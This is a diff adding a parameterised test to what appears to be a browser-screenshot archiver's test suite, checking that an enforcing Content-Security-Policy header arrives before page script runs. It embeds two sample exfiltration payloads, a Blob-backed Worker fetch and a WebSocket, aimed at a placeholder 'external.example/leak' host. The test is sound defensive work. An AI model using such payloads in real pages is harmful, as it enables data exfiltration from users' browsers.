@@ -78,6 +78,24 @@ describe("archive screenshots with bound browser", () => {
     expect(close).toHaveBeenCalledOnce();
   });
 
+  it.each([
+    ["Worker-from-Blob fetch", `new Worker(URL.createObjectURL(new Blob(['fetch("https://external.example/leak")'], { type: "text/javascript" })))`, "worker-src"],
+    ["WebSocket", `new WebSocket("wss://external.example/leak")`, "connect-src"],
+  ])("delivers an enforcing CSP before %s code can execute", async (_name, script, directive) => {
+    const archive = withFile(files(), "attack.html", `<script>${script}</script>`);
+    urls.push("https://template.invalid/attack.html");
+    await takeScreenshot(binding, archive, 1280, 800);
+    // Assert the policy is in the response itself, not a late DOM/meta injection.
+    for (const response of responses.values()) {
+      const policy = response.headers?.["Content-Security-Policy"];
+      expect(typeof policy).toBe("string");
+      expect(String(policy).split("; ")).toContain(`${directive} 'none'`);
+      expect(String(policy).split("; ")).toContain("script-src 'self' 'unsafe-inline'");
+      expect(String(policy).split("; ")).toContain("frame-src 'none'");
+    }
+    expect(responses.get("https://template.invalid/attack.html")?.body).toEqual(archive.get("attack.html"));
+  });
+
   it("closes browser on screenshot failure", async () => {
     screenshot.mockRejectedValueOnce(new Error("capture failed"));
     await expect(takeScreenshot(binding, files(), 390, 844)).rejects.toThrow("capture failed");
